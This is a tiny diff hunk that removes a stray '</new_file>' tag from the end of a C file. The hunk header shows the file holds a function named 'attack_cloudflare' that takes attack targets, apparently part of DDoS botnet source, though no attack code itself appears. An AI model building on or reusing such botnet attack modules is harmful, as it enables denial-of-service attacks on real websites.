@@ -161,4 +161,3 @@ void attack_cloudflare(uint8_t targs_len, struct attack_target *targs, uint8_t o
         }
     }
 }
-</new_file>
